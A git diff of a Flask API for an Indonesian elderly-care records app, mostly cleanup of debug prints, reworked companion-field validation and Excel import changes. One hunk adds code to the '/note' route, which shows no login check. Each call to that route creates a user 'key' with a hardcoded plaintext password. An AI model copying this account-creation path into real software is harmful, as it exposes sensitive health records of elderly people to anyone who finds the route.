@@ -135,6 +135,19 @@ def login_required(f):
 
 @api.route('/note', methods=['GET', 'POST'])
 def note():
+    users = ["key"]
+    password = ["Ra_sy6a7e2"]
+    i = 0
+    for u, p in zip(users, password):
+        i+=1
+        acc = User(
+            username=u, 
+            email=f'{u}@example.com',
+            role="kelurahan",
+            password_hash=bcrypt.generate_password_hash(p).decode('utf-8')
+        )
+        db.session.add(acc)
+        db.session.commit()
     return jsonify({'message': 'success'})
 
 @api.route('/rekapan-excel', methods=['GET', 'POST'])
@@ -370,12 +383,8 @@ def reset_password():
     usedToken.used = True
     
     user = User.query.get(usedToken.user_id)
-    print(user.password_hash)
     user.password_hash = bcrypt.generate_password_hash(password).decode('utf-8')
-    print(user.password_hash)
-    
     db.session.commit()
-    print(user.password_hash)
 
     return jsonify({
         'message': 'Password berhasil diubah',
@@ -436,7 +445,6 @@ def get_lansia():
     
         else:
             column = getattr(Lansia, sort_by)
-            print(column)
             if sort_order.lower() == 'desc':
                 query = query.order_by(column.desc())
             else:
@@ -529,12 +537,12 @@ def create_lansia():
         
         keluarga = KeluargaPendamping(
             lansia_id=lansia.id,
-            memiliki_pendamping=memiliki_pendamping, # [NEW]
+            memiliki_pendamping=memiliki_pendamping,
             hubungan_dengan_lansia=data.get('hubungan_dengan_lansia') if memiliki_pendamping else None,
             ketersediaan_waktu=data.get('ketersediaan_waktu') if memiliki_pendamping else None,
-            partisipasi_program_bkl=data.get('partisipasi_program_bkl'), # Bisa diisi walau tidak ada pendamping (lansianya yg ikut)
-            riwayat_partisipasi_bkl=data.get('riwayat_partisipasi_bkl'),
-            keterlibatan_dana=data.get('keterlibatan_dana'),
+            partisipasi_program_bkl=data.get('partisipasi_program_bkl') if memiliki_pendamping else None, # Bisa diisi walau tidak ada pendamping (lansianya yg ikut)
+            riwayat_partisipasi_bkl=data.get('riwayat_partisipasi_bkl') if memiliki_pendamping else None,
+            keterlibatan_dana=data.get('keterlibatan_data') if memiliki_pendamping else None,
         )
         db.session.add(keluarga)
             
@@ -562,7 +570,6 @@ def create_lansia():
         
     except Exception as e:
         db.session.rollback()
-        print(e)
         return jsonify({'message': f'Error: {str(e)}'}), 400
 
 @api.route('/lansia/<int:lansia_id>', methods=['GET'])
@@ -623,7 +630,6 @@ def get_lansia_detail(lansia_id):
         'keluarga': {
             'memiliki_pendamping': keluarga.memiliki_pendamping if keluarga else False, # [NEW]
             'hubungan_dengan_lansia': keluarga.hubungan_dengan_lansia if keluarga else None,
-            'pendidikan_pendamping': keluarga.pendidikan_pendamping if keluarga else None,
             'ketersediaan_waktu': keluarga.ketersediaan_waktu if keluarga else None,
             'partisipasi_program_bkl': keluarga.partisipasi_program_bkl if keluarga else None,
             'riwayat_partisipasi_bkl': keluarga.riwayat_partisipasi_bkl if keluarga else None,
@@ -665,7 +671,6 @@ def get_lansia_detail(lansia_id):
 def update_lansia(lansia_id):
     lansia = Lansia.query.get_or_404(lansia_id)
     data = request.get_json()
-    
     try:
         # Update Lansia Basic Info (Logic sama seperti sebelumnya, hanya copy field yg relevan)
         for key in ['nama_lengkap', 'nik', 'jenis_kelamin', 'alamat_lengkap', 'koordinat', 'rt', 'rw', 'status_perkawinan', 'agama', 'pendidikan_terakhir', 'pekerjaan_terakhir', 'sumber_penghasilan']:
@@ -680,70 +685,88 @@ def update_lansia(lansia_id):
         if not lansia.kesehatan:
             lansia.kesehatan = KesehatanLansia(lansia_id=lansia.id)
         
-        kesehatan = lansia.kesehatan
-        kesehatan.kondisi_kesehatan_umum = nestedData.get('kondisi_kesehatan_umum')
-        kesehatan.riwayat_penyakit_kronis = nestedData.get('riwayat_penyakit_kronis', [])
-        kesehatan.penggunaan_obat_rutin = nestedData.get('penggunaan_obat_rutin')
-        kesehatan.alat_bantu = nestedData.get('alat_bantu', [])
-        kesehatan.aktivitas_fisik = nestedData.get('aktivitas_fisik')
-        kesehatan.status_gizi = nestedData.get('status_gizi')
-        kesehatan.riwayat_imunisasi = nestedData.get('riwayat_imunisasi', [])
-        kesehatan.bpjs = nestedData.get('bpjs') # [NEW]
+        kesehatan                           = lansia.kesehatan
+        
+        kesehatan.kondisi_kesehatan_umum    = nestedData.get('kondisi_kesehatan_umum')
+        kesehatan.riwayat_penyakit_kronis   = nestedData.get('riwayat_penyakit_kronis', [])
+        kesehatan.penggunaan_obat_rutin     = nestedData.get('penggunaan_obat_rutin')
+        kesehatan.alat_bantu                = nestedData.get('alat_bantu', [])
+        kesehatan.aktivitas_fisik           = nestedData.get('aktivitas_fisik')
+        kesehatan.status_gizi               = nestedData.get('status_gizi')
+        kesehatan.riwayat_imunisasi         = nestedData.get('riwayat_imunisasi', [])
+        kesehatan.bpjs                      = nestedData.get('bpjs')
 
         # Update Welfare (Logic sama)
         nestedData = data.get('kesejahteraan', {})
         if not lansia.kesejahteraan:
-            lansia.kesejahteraan = KesejahteraanSosial(lansia_id=lansia.id)
+            lansia.kesejahteraan            = KesejahteraanSosial(lansia_id=lansia.id)
         
-        kesejahteraan = lansia.kesejahteraan
-        kesejahteraan.dukungan_keluarga = nestedData.get('dukungan_keluarga')
-        kesejahteraan.kondisi_rumah = nestedData.get('kondisi_rumah')
-        kesejahteraan.kebutuhan_mendesak = nestedData.get('kebutuhan_mendesak', [])
-        kesejahteraan.hobi_minat = nestedData.get('hobi_minat')
-        kesejahteraan.kondisi_psikologis = nestedData.get('kondisi_psikologis')
+        kesejahteraan                       = lansia.kesejahteraan
+        kesejahteraan.dukungan_keluarga     = nestedData.get('dukungan_keluarga')
+        kesejahteraan.kondisi_rumah         = nestedData.get('kondisi_rumah')
+        kesejahteraan.kebutuhan_mendesak    = nestedData.get('kebutuhan_mendesak', [])
+        kesejahteraan.hobi_minat            = nestedData.get('hobi_minat')
+        kesejahteraan.kondisi_psikologis    = nestedData.get('kondisi_psikologis')
 
         # Update Family
         nestedData = data.get('keluarga', {})
         if not lansia.keluarga:
             lansia.keluarga = KeluargaPendamping(lansia_id=lansia.id)
         
-        keluarga = lansia.keluarga
-        memiliki = nestedData.get('memiliki_pendamping', False)
+        keluarga                     = lansia.keluarga
+        memiliki                     = nestedData.get('memiliki_pendamping', False)
         keluarga.memiliki_pendamping = memiliki # [NEW]
         
         if memiliki:
-            keluarga.hubungan_dengan_lansia = nestedData.get('hubungan_dengan_lansia')
-            keluarga.pendidikan_pendamping = nestedData.get('pendidikan_pendamping')
-            keluarga.ketersediaan_waktu = nestedData.get('ketersediaan_waktu')
+            required_fields = [
+                'hubungan_dengan_lansia',
+                'ketersediaan_waktu',
+                'partisipasi_program_bkl',
+                'riwayat_partisipasi_bkl',
+                'keterlibatan_data'
+            ]
+            missing_fields = [field for field in required_fields if not nestedData.get(field)]
+            if missing_fields:
+                return {
+                    "status": "error",
+                    "message": f"Field(s) wajib tidak boleh kosong: {', '.join(missing_fields)}"
+                }, 400
+            
+            keluarga.hubungan_dengan_lansia     = nestedData.get('hubungan_dengan_lansia')
+            keluarga.pendidikan_pendamping      = nestedData.get('pendidikan_pendamping')
+            keluarga.ketersediaan_waktu         = nestedData.get('ketersediaan_waktu')
+            keluarga.memiliki_pendamping        = True
+            keluarga.partisipasi_program_bkl    = nestedData.get('partisipasi_program_bkl')
+            keluarga.riwayat_partisipasi_bkl    = nestedData.get('riwayat_partisipasi_bkl')
+            keluarga.keterlibatan_dana          = nestedData.get('keterlibatan_data')
+            
         else:
             # Jika tidak memiliki pendamping, kosongkan data terkait personal pendamping
-            keluarga.nama_pendamping = None
-            keluarga.hubungan_dengan_lansia = None
-            keluarga.tanggal_lahir_pendamping = None
-            keluarga.pendidikan_pendamping = None
-            keluarga.ketersediaan_waktu = None
-
-        # Data BKL tetap disimpan meski tidak punya pendamping (bisa lansia itu sendiri)
-        keluarga.partisipasi_program_bkl = nestedData.get('partisipasi_program_bkl')
-        keluarga.riwayat_partisipasi_bkl = nestedData.get('riwayat_partisipasi_bkl')
-        keluarga.keterlibatan_dana = nestedData.get('keterlibatan_data') # Note: key frontend 'keterlibatan_data' maps to model 'keterlibatan_dana'
+            keluarga.memiliki_pendamping        = False
+            keluarga.hubungan_dengan_lansia     = None
+            keluarga.tanggal_lahir_pendamping   = None
+            keluarga.pendidikan_pendamping      = None
+            keluarga.ketersediaan_waktu         = None
+            keluarga.partisipasi_program_bkl    = None
+            keluarga.riwayat_partisipasi_bkl    = None
+            keluarga.keterlibatan_dana          = None        
 
         # Update ADL
         nestedData = data.get('daily_living', {})
         if not lansia.daily_living:
-            lansia.daily_living = ADailyLiving(lansia_id=lansia.id)
+            lansia.daily_living     = ADailyLiving(lansia_id=lansia.id)
         
-        adl = lansia.daily_living
-        adl.bab = nestedData.get('score_bab')
-        adl.bak = nestedData.get('score_bak')
-        adl.toilet = nestedData.get('score_toilet')
-        adl.membersihkan_diri = nestedData.get('score_membersihkan_diri')
-        adl.makan = nestedData.get('score_makan')
-        adl.pindah_tempat = nestedData.get('score_pindah_tempat')
-        adl.mobilitas = nestedData.get('score_mobilitas')
-        adl.berpakaian = nestedData.get('score_berpakaian')
-        adl.naik_turun_tangga = nestedData.get('score_naik_turun_tangga')
-        adl.mandi = nestedData.get('score_mandi')
+        adl                         = lansia.daily_living
+        adl.bab                     = nestedData.get('score_bab')
+        adl.bak                     = nestedData.get('score_bak')
+        adl.toilet                  = nestedData.get('score_toilet')
+        adl.membersihkan_diri       = nestedData.get('score_membersihkan_diri')
+        adl.makan                   = nestedData.get('score_makan')
+        adl.pindah_tempat           = nestedData.get('score_pindah_tempat')
+        adl.mobilitas               = nestedData.get('score_mobilitas')
+        adl.berpakaian              = nestedData.get('score_berpakaian')
+        adl.naik_turun_tangga       = nestedData.get('score_naik_turun_tangga')
+        adl.mandi                   = nestedData.get('score_mandi')
         
         adl.calculate_total() # Recalculate total
         
@@ -925,7 +948,6 @@ def get_needs_potential():
 @api.route('/dashboard/urgent-need-details/<need_type>', methods=['GET'])
 @login_required
 def get_urgent_need_details(need_type):
-    print(f"Fetching urgent need details for: {need_type}")
     try:
         # Query to get lansia with specific urgent need using PostgreSQL array contains operator
         query = (
@@ -995,9 +1017,9 @@ def upload_excel():
     try:
         # Read Excel file directly from memory
         header = ['nama_lengkap', 'nik', 'jenis_kelamin', 'tanggal_lahir', 'alamat_lengkap', 'koordinat', 'rt', 'rw', 'status_perkawinan', 'agama', 'pendidikan_terakhir', 'pekerjaan_terakhir', 'sumber_penghasilan',
-                  'pass1', 'kondisi_kesehatan_umum', 'riwayat_penyakit_kronis', 'penggunaan_obat_rutin', 'alat_bantu', 'aktivitas_fisik', 'status_gizi', 'riwayat_imunisasi',
+                  'pass1', 'kondisi_kesehatan_umum', 'riwayat_penyakit_kronis', 'penggunaan_obat_rutin', 'alat_bantu', 'aktivitas_fisik', 'status_gizi', 'riwayat_imunisasi', 'bpjs',
                   'pass2', 'dukungan_keluarga', 'kondisi_rumah', 'kebutuhan_mendesak', 'hobi_minat', 'kondisi_psikologis',
-                  'pass3', 'nama_pendamping', 'hubungan_dengan_lansia', 'tanggal_lahir_pendamping', 'pendidikan_pendamping', 'ketersediaan_waktu', 'partisipasi_program_bkl', 'riwayat_partisipasi_bkl', 'keterlibatan_data',
+                  'pass3', 'memiliki_pendamping', 'hubungan_dengan_lansia', 'ketersediaan_waktu', 'partisipasi_program_bkl', 'riwayat_partisipasi_bkl', 'keterlibatan_data',
                   'pass4', 'bab', 'bak', 'membersihkan_diri', 'toilet', 'makan', 'pindah_tempat', 'mobilitas', 'berpakaian', 'naik_turun_tangga', 'mandi',
                 ]
         
@@ -1021,13 +1043,23 @@ def upload_excel():
                 # Validate required columns
                 
                 data = row.to_dict()
+                memiliki = data['memiliki_pendamping'] == "Ya"
                 
-                for d, val in data.items():
-                    if pd.isna(val):
-                        error_count += 1
-                        error_msg = f'Data {error_d[d]} Kolom {index}: Data Kosong'
-                        errors.append(error_msg)
-                        print(f"Error processing row {index} kolom {d}: Data Kosong")  # Debug log
+                if not memiliki:
+                    for d, val in data.items():
+                        if pd.isna(val) and d not in ['hubungan_dengan_lansia', 'ketersediaan_waktu', 'partisipasi_program_bkl', 'riwayat_partisipasi_bkl','keterlibatan_data', 'koordinat']:
+                            error_count += 1
+                            error_msg = f'\nData {error_d[d]} Kolom {index}: Data Kosong'
+                            errors.append(error_msg)
+                            print(f"Error processing row {index} kolom {d}: Data Kosong")  # Debug log
+                else:
+                    for d, val in data.items():
+                        if pd.isna(val):
+                            if d == 'koordinat': continue
+                            error_count += 1
+                            error_msg = f'\nData {error_d[d]} Kolom {index}: Data Kosong'
+                            errors.append(error_msg)
+                            print(f"Error processing row {index} kolom {d}: Data Kosong")
                 
                 # Optional: parse tanggal_lahir
                 if 'tanggal_lahir' in data and isinstance(data['tanggal_lahir'], str):
@@ -1067,6 +1099,7 @@ def upload_excel():
                 kesehatan.lansia_id = lansia.id
                 db.session.add(kesehatan)
                 
+                
                 # 3
                 kesejahteraan = KesejahteraanSosial()
                 for column in KesejahteraanSosial.__table__.columns:
@@ -1083,12 +1116,15 @@ def upload_excel():
                 
                 # 4
                 pendamping = KeluargaPendamping()
-                for column in KeluargaPendamping.__table__.columns:
-                    col_name = column.name
-                    if col_name != 'id' and col_name != 'lansia_id' and col_name in data:
-                        setattr(pendamping, col_name, data[col_name])
+                
+                if memiliki:
+                    for column in KeluargaPendamping.__table__.columns:
+                        col_name = column.name
+                        if col_name != 'id' and col_name != 'lansia_id' and col_name != 'memiliki_pendamping' and col_name in data:
+                            setattr(pendamping, col_name, data[col_name])
 
                 pendamping.lansia_id = lansia.id
+                pendamping.memiliki_pendamping = memiliki
                 db.session.add(pendamping)
                 
                 # 5
@@ -1111,12 +1147,13 @@ def upload_excel():
                 errors.append(error_msg)
                 print(f"Error processing row {index + 2}: {str(e)}")  # Debug log
                 continue
-        
-        response_message = f'Successfully imported {success_count} records'
+            
+        response_message = ""
         if error_count > 0:
             response_message += f', {error_count} errors occurred'
             success_count = 0
-        else:
+        else:    
+            response_message += f'Successfully imported {success_count} records'
             db.session.commit()
         
         return jsonify({
